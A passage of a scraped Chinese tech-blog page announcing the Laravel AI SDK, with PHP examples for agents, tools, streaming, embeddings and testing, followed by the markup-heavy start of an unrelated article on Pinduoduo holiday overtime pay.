h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Laravel AI SDK 正式发布</h2>
<p>Laravel AI SDK 今天正式发布了。这个由 Taylor Otwell 开发数月的官方包，为 Laravel 应用提供了一套统一的 AI 交互接口，覆盖文本对话、图像生成、语音合成、语音转录、向量嵌入等场景，支持 OpenAI、Anthropic、Gemini、Groq、xAI 等主流服务商。</p>
<p>安装方式和其他 Laravel 官方包一样简单：</p>
<pre><code class="hljs language-shell" lang="shell">composer require laravel/ai
</code></pre>
<h3 data-id="heading-1">Agent：核心交互单元</h3>
<p>SDK 的核心概念是 Agent。每个 Agent 是一个 PHP 类，封装了系统指令、对话上下文、工具和输出格式。可以把它理解为一个专用助手——销售教练、文档分析器、客服机器人——配置一次，随处调用。</p>
<p>通过 Artisan 命令创建：</p>
<pre><code class="hljs language-shell" lang="shell">php artisan make:agent SalesCoach
</code></pre>
<p>生成的类实现 <code>Agent</code> 接口，定义 <code>instructions()</code> 方法提供系统提示词，然后调用 <code>prompt()</code> 发起对话：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$response</span> = <span class="hljs-title class_">SalesCoach</span>::<span class="hljs-title function_ invoke__">make</span>(<span class="hljs-attr">user</span>: <span class="hljs-variable">$user</span>)
    -&gt;<span class="hljs-title function_ invoke__">prompt</span>(<span class="hljs-string">'分析这段销售录音...'</span>);

<span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$response</span>;
</code></pre>
<p><code>prompt()</code> 方法支持在调用时切换服务商和模型：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$response</span> = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SalesCoach</span>)-&gt;<span class="hljs-title function_ invoke__">prompt</span>(
    <span class="hljs-string">'分析这段销售录音...'</span>,
    <span class="hljs-attr">provider</span>: <span class="hljs-string">'anthropic'</span>,
    <span class="hljs-attr">model</span>: <span class="hljs-string">'claude-haiku-4-5-20251001'</span>,
    <span class="hljs-attr">timeout</span>: <span class="hljs-number">120</span>,
);
</code></pre>
<p>如果不想创建专门的类，也可以用匿名 Agent 快速调用：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">use</span> <span class="hljs-keyword">function</span> <span class="hljs-title">Laravel</span>\<span class="hljs-title">Ai</span>\{<span class="hljs-title">agent</span>};

<span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">agent</span>(
    <span class="hljs-attr">instructions</span>: <span class="hljs-string">'You are an expert at software development.'</span>,
)-&gt;<span class="hljs-title function_ invoke__">prompt</span>(<span class="hljs-string">'Tell me about Laravel'</span>);
</code></pre>
<h3 data-id="heading-2">结构化输出</h3>
<p>Agent 可以返回结构化数据，而不仅仅是纯文本。实现 <code>HasStructuredOutput</code> 接口，定义 <code>schema()</code> 方法即可：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">schema</span>(<span class="hljs-params">JsonSchema <span class="hljs-variable">$schema</span></span>): <span class="hljs-title">array</span>
</span>{
    <span class="hljs-keyword">return</span> [
        <span class="hljs-string">'feedback'</span> =&gt; <span class="hljs-variable">$schema</span>-&gt;<span class="hljs-keyword">string</span>()-&gt;<span class="hljs-title function_ invoke__">required</span>(),
        <span class="hljs-string">'score'</span> =&gt; <span class="hljs-variable">$schema</span>-&gt;<span class="hljs-keyword">integer</span>()-&gt;<span class="hljs-title function_ invoke__">min</span>(<span class="hljs-number">1</span>)-&gt;<span class="hljs-title function_ invoke__">max</span>(<span class="hljs-number">10</span>)-&gt;<span class="hljs-title function_ invoke__">required</span>(),
    ];
}
</code></pre>
<p>调用后直接当数组用：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$response</span> = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SalesCoach</span>)-&gt;<span class="hljs-title function_ invoke__">prompt</span>(<span class="hljs-string">'分析这段录音...'</span>);

<span class="hljs-keyword">return</span> <span class="hljs-variable">$response</span>[<span class="hljs-string">'score'</span>]; <span class="hljs-comment">// 8</span>
</code></pre>
<h3 data-id="heading-3">对话记忆</h3>
<p>Agent 支持自动持久化对话历史。使用 <code>RemembersConversations</code> trait 后，SDK 会自动将对话存入数据库，后续可以通过 <code>continue()</code> 方法继续之前的对话：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// 开始新对话</span>
<span class="hljs-variable">$response</span> = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SalesCoach</span>)-&gt;<span class="hljs-title function_ invoke__">forUser</span>(<span class="hljs-variable">$user</span>)-&gt;<span class="hljs-title function_ invoke__">prompt</span>(<span class="hljs-string">'你好！'</span>);
<span class="hljs-variable">$conversationId</span> = <span class="hljs-variable">$response</span>-&gt;conversationId;

<span class="hljs-comment">// 继续对话</span>
<span class="hljs-variable">$response</span> = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SalesCoach</span>)
    -&gt;<span class="hljs-keyword">continue</span>(<span class="hljs-variable">$conversationId</span>, <span class="hljs-keyword">as</span>: <span class="hljs-variable">$user</span>)
    -&gt;<span class="hljs-title function_ invoke__">prompt</span>(<span class="hljs-string">'接着刚才的话题...'</span>);
</code></pre>
<h3 data-id="heading-4">工具系统</h3>
<p>Agent 可以使用工具来扩展能力。通过 <code>make:tool</code> 命令创建工具类，定义输入 schema 和 <code>handle()</code> 方法：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RandomNumberGenerator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Tool</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">description</span>(<span class="hljs-params"/>): <span class="hljs-title">string</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">'生成加密安全的随机数。'</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>): <span class="hljs-title">string</span>
    </span>{
        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) <span class="hljs-title function_ invoke__">random_int</span>(<span class="hljs-variable">$request</span>[<span class="hljs-string">'min'</span>], <span class="hljs-variable">$request</span>[<span class="hljs-string">'max'</span>]);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">schema</span>(<span class="hljs-params">JsonSchema <span class="hljs-variable">$schema</span></span>): <span class="hljs-title">array</span>
    </span>{
        <span class="hljs-keyword">return</span> [
            <span class="hljs-string">'min'</span> =&gt; <span class="hljs-variable">$schema</span>-&gt;<span class="hljs-keyword">integer</span>()-&gt;<span class="hljs-title function_ invoke__">min</span>(<span class="hljs-number">0</span>)-&gt;<span class="hljs-title function_ invoke__">required</span>(),
            <span class="hljs-string">'max'</span> =&gt; <span class="hljs-variable">$schema</span>-&gt;<span class="hljs-keyword">integer</span>()-&gt;<span class="hljs-title function_ invoke__">required</span>(),
        ];
    }
}
</code></pre>
<p>SDK 还内置了几个服务商级别的工具：</p>
<ul>
<li><strong>WebSearch</strong> — 让 Agent 搜索网页，支持 Anthropic、OpenAI、Gemini</li>
<li><strong>WebFetch</strong> — 让 Agent 抓取网页内容，支持 Anthropic、Gemini</li>
<li><strong>FileSearch</strong> — 在向量存储中搜索文件，支持 OpenAI、Gemini</li>
<li><strong>SimilaritySearch</strong> — 基于 Eloquent 模型的向量相似度搜索，用于 RAG 场景</li>
</ul>
<h3 data-id="heading-5">流式响应与广播</h3>
<p>对于需要实时输出的场景，Agent 支持流式响应。返回值可以直接作为路由响应，自动发送 SSE：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title class_">Route</span>::<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">'/coach'</span>, function () {
    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SalesCoach</span>)-&gt;<span class="hljs-title function_ invoke__">stream</span>(<span class="hljs-string">'分析这段录音...'</span>);
});
</code></pre>
<p>流式事件还可以通过 Laravel Broadcasting 广播到前端频道，或者使用 Vercel AI SDK 协议与前端框架对接：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SalesCoach</span>)
    -&gt;<span class="hljs-title function_ invoke__">stream</span>(<span class="hljs-string">'分析这段录音...'</span>)
    -&gt;<span class="hljs-title function_ invoke__">usingVercelDataProtocol</span>();
</code></pre>
<h3 data-id="heading-6">队列处理</h3>
<p>耗时的 AI 请求可以推入队列在后台处理：</p>
<pre><code class="hljs language-php" lang="php">(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SalesCoach</span>)
    -&gt;<span class="hljs-title function_ invoke__">queue</span>(<span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">'transcript'</span>))
    -&gt;<span class="hljs-title function_ invoke__">then</span>(function (AgentResponse <span class="hljs-variable">$response</span>) {
        <span class="hljs-comment">// 处理响应...</span>
    })
    -&gt;<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span></span>) </span>{
        <span class="hljs-comment">// 处理异常...</span>
    });
</code></pre>
<h3 data-id="heading-7">图像生成</h3>
<p><code>Image</code> 类提供了简洁的图像生成接口，支持 OpenAI、Gemini 和 xAI：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">use</span> <span class="hljs-title">Laravel</span>\<span class="hljs-title">Ai</span>\<span class="hljs-title">Image</span>;

<span class="hljs-variable">$image</span> = <span class="hljs-title class_">Image</span>::<span class="hljs-title function_ invoke__">of</span>(<span class="hljs-string">'厨房台面上的甜甜圈'</span>)
    -&gt;<span class="hljs-title function_ invoke__">quality</span>(<span class="hljs-string">'high'</span>)
    -&gt;<span class="hljs-title function_ invoke__">landscape</span>()
    -&gt;<span class="hljs-title function_ invoke__">generate</span>();

<span class="hljs-variable">$path</span> = <span class="hljs-variable">$image</span>-&gt;<span class="hljs-title function_ invoke__">store</span>();
</code></pre>
<p>支持附加参考图像进行风格迁移，也可以推入队列异步生成。</p>
<h3 data-id="heading-8">音频与转录</h3>
<p>语音合成（TTS）和语音转录（STT）同样被纳入 SDK：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">use</span> <span class="hljs-title">Laravel</span>\<span class="hljs-title">Ai</span>\<span class="hljs-title">Audio</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Laravel</span>\<span class="hljs-title">Ai</span>\<span class="hljs-title">Transcription</span>;

<span class="hljs-comment">// 文字转语音</span>
<span class="hljs-variable">$audio</span> = <span class="hljs-title class_">Audio</span>::<span class="hljs-title function_ invoke__">of</span>(<span class="hljs-string">'I love coding with Laravel.'</span>)
    -&gt;<span class="hljs-title function_ invoke__">female</span>()
    -&gt;<span class="hljs-title function_ invoke__">instructions</span>(<span class="hljs-string">'用海盗的语气说'</span>)
    -&gt;<span class="hljs-title function_ invoke__">generate</span>();

<span class="hljs-comment">// 语音转文字</span>
<span class="hljs-variable">$transcript</span> = <span class="hljs-title class_">Transcription</span>::<span class="hljs-title function_ invoke__">fromStorage</span>(<span class="hljs-string">'audio.mp3'</span>)
    -&gt;<span class="hljs-title function_ invoke__">diarize</span>() <span class="hljs-comment">// 按说话人分段</span>
    -&gt;<span class="hljs-title function_ invoke__">generate</span>();
</code></pre>
<p>TTS 支持 OpenAI 和 ElevenLabs，STT 同样支持这两个服务商。</p>
<h3 data-id="heading-9">Embeddings 与向量搜索</h3>
<p>生成向量嵌入变得非常直观。Laravel 的 <code>Stringable</code> 类新增了 <code>toEmbeddings()</code> 方法：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$embeddings</span> = <span class="hljs-title class_">Str</span>::<span class="hljs-title function_ invoke__">of</span>(<span class="hljs-string">'Napa Valley has great wine.'</span>)-&gt;<span class="hljs-title function_ invoke__">toEmbeddings</span>();
</code></pre>
<p>配合 PostgreSQL 的 pgvector 扩展，可以在数据库中直接进行向量相似度查询：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$documents</span> = <span class="hljs-title class_">Document</span>::<span class="hljs-title function_ invoke__">query</span>()
    -&gt;<span class="hljs-title function_ invoke__">whereVectorSimilarTo</span>(<span class="hljs-string">'embedding'</span>, <span class="hljs-string">'纳帕谷最好的酒庄'</span>)
    -&gt;<span class="hljs-title function_ invoke__">limit</span>(<span class="hljs-number">10</span>)
    -&gt;<span class="hljs-title function_ invoke__">get</span>();
</code></pre>
<p>传入字符串时，Laravel 会自动生成嵌入向量再进行查询，不需要手动处理。Embedding 还支持缓存，避免重复调用 API。</p>
<h3 data-id="heading-10">Reranking</h3>
<p>Reranking 可以对搜索结果按语义相关性重新排序，支持 Cohere 和 Jina：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$posts</span> = <span class="hljs-title class_">Post</span>::<span class="hljs-title function_ invoke__">all</span>()-&gt;<span class="hljs-title function_ invoke__">rerank</span>(<span class="hljs-string">'body'</span>, <span class="hljs-string">'Laravel 教程'</span>);
</code></pre>
<p>这个功能直接以 Collection 宏的形式提供，可以对 Eloquent 集合按指定字段做语义重排。</p>
<h3 data-id="heading-11">文件与向量存储</h3>
<p>SDK 提供了文件管理和向量存储的完整方案。文件可以上传到服务商存储后反复引用，向量存储则用于 RAG 场景下的文件检索：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">use</span> <span class="hljs-title">Laravel</span>\<span class="hljs-title">Ai</span>\<span class="hljs-title">Files</span>\<span class="hljs-title">Document</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Laravel</span>\<span class="hljs-title">Ai</span>\<span class="hljs-title">Stores</span>;

<span class="hljs-comment">// 上传文件</span>
<span class="hljs-variable">$stored</span> = <span class="hljs-title class_">Document</span>::<span class="hljs-title function_ invoke__">fromPath</span>(<span class="hljs-string">'/path/to/report.pdf'</span>)-&gt;<span class="hljs-title function_ invoke__">put</span>();

<span class="hljs-comment">// 创建向量存储并添加文件</span>
<span class="hljs-variable">$store</span> = <span class="hljs-title class_">Stores</span>::<span class="hljs-title function_ invoke__">create</span>(<span class="hljs-string">'知识库'</span>);
<span class="hljs-variable">$store</span>-&gt;<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-variable">$stored</span>);
</code></pre>
<h3 data-id="heading-12">Failover</h3>
<p>调用时传入服务商数组，SDK 会在主服务商不可用时自动切换到备用服务商：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$response</span> = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SalesCoach</span>)-&gt;<span class="hljs-title function_ invoke__">prompt</span>(
    <span class="hljs-string">'分析这段录音...'</span>,
    <span class="hljs-attr">provider</span>: [<span class="hljs-string">'openai'</span>, <span class="hljs-string">'anthropic'</span>],
);
</code></pre>
<h3 data-id="heading-13">Agent 配置</h3>
<p>Agent 支持通过 PHP Attribute 配置参数，包括最大步数、最大 token 数、温度、超时时间等：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">#[MaxSteps</span>(<span class="hljs-number">10</span>)<span class="hljs-meta">]</span>
<span class="hljs-meta">#[MaxTokens</span>(<span class="hljs-number">4096</span>)<span class="hljs-meta">]</span>
<span class="hljs-meta">#[Provider</span>(<span class="hljs-string">'anthropic'</span>)<span class="hljs-meta">]</span>
<span class="hljs-meta">#[Temperature</span>(<span class="hljs-number">0.7</span>)<span class="hljs-meta">]</span>
<span class="hljs-meta">#[Timeout</span>(<span class="hljs-number">120</span>)<span class="hljs-meta">]</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SalesCoach</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Agent</span>
</span>{
    <span class="hljs-keyword">use</span> <span class="hljs-title">Promptable</span>;
}
</code></pre>
<p><code>UseCheapestModel</code> 和 <code>UseSmartestModel</code> 两个 Attribute 可以自动选择服务商最便宜或最强的模型，不需要记具体的模型名。</p>
<h3 data-id="heading-14">中间件</h3>
<p>Agent 支持中间件机制，可以在请求发送前后插入自定义逻辑，比如日志记录：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogPrompts</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span>(<span class="hljs-params">AgentPrompt <span class="hljs-variable">$prompt</span>, <span class="hljs-built_in">Closure</span> <span class="hljs-variable">$next</span></span>)
    </span>{
        <span class="hljs-title class_">Log</span>::<span class="hljs-title function_ invoke__">info</span>(<span class="hljs-string">'Prompting agent'</span>, [<span class="hljs-string">'prompt'</span> =&gt; <span class="hljs-variable">$prompt</span>-&gt;prompt]);

        <span class="hljs-keyword">return</span> <span class="hljs-variable">$next</span>(<span class="hljs-variable">$prompt</span>)-&gt;<span class="hljs-title function_ invoke__">then</span>(function (AgentResponse <span class="hljs-variable">$response</span>) {
            <span class="hljs-title class_">Log</span>::<span class="hljs-title function_ invoke__">info</span>(<span class="hljs-string">'Agent responded'</span>, [<span class="hljs-string">'text'</span> =&gt; <span class="hljs-variable">$response</span>-&gt;text]);
        });
    }
}
</code></pre>
<h3 data-id="heading-15">测试支持</h3>
<p>SDK 为每个功能都提供了 <code>fake()</code> 方法和断言 API，测试时不需要真实调用 AI 服务商：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title class_">SalesCoach</span>::<span class="hljs-title function_ invoke__">fake</span>([<span class="hljs-string">'第一条响应'</span>, <span class="hljs-string">'第二条响应'</span>]);

<span class="hljs-comment">// 执行业务逻辑...</span>

<span class="hljs-title class_">SalesCoach</span>::<span class="hljs-title function_ invoke__">assertPrompted</span>(<span class="hljs-string">'分析这段...'</span>);
<span class="hljs-title class_">SalesCoach</span>::<span class="hljs-title function_ invoke__">assertNeverPrompted</span>();
</code></pre>
<p>图像、音频、转录、Embeddings、Reranking、文件操作、向量存储都有对应的 fake 和断言方法。</p>
<h3 data-id="heading-16">服务商支持一览</h3>





































<table><thead><tr><th>功能</th><th>支持的服务商</th></tr></thead><tbody><tr><td>文本对话</td><td>OpenAI、Anthropic、Gemini、Groq、xAI</td></tr><tr><td>图像生成</td><td>OpenAI、Gemini、xAI</td></tr><tr><td>语音合成</td><td>OpenAI、ElevenLabs</td></tr><tr><td>语音转录</td><td>OpenAI、ElevenLabs</td></tr><tr><td>向量嵌入</td><td>OpenAI、Gemini、Cohere、Jina</td></tr><tr><td>重排序</td><td>Cohere、Jina</td></tr><tr><td>文件管理</td><td>OpenAI、Anthropic、Gemini</td></tr></tbody></table>
<h3 data-id="heading-17">小结</h3>
<p>Laravel AI SDK 把 AI 集成做成了 Laravel 开发者熟悉的样子：Artisan 命令生成类、接口约束行为、trait 复用逻辑、队列异步处理、fake 方法写测试。如果你的 Laravel 项目需要接入 AI 能力，这个包值得尝试。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-02%2Flaravel-ai-sdk-released" target="_blank" title="https://catchadmin.com/post/2026-02/laravel-ai-sdk-released" ref="nofollow noopener noreferrer">🎉Laravel AI SDK 正式发布</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[拼多多春节加班工资曝光，没几个敢给这个数的。]]></title>    <link>https://juejin.cn/post/7603216479836045363</link>    <guid>https://juejin.cn/post/7603216479836045363</guid>    <pubDate>2026-02-06T00:40:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603216479836045363" data-draft-id="7603186080494534707" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="拼多多春节加班工资曝光，没几个敢给这个数的。"/> <meta itemprop="keywords" content="前端,后端,程序员"/> <meta itemprop="datePublished" content="2026-02-06T00:40:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CodeSheep"/> <meta itemprop="url" content="https://juejin.cn/user/4371313961738616"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            拼多多春节加班工资曝光，没几个敢给这个数的。
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4371313961738616/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CodeSheep
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-06T00:40:34.000Z" title="Fri Feb 06 2026 00:40:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 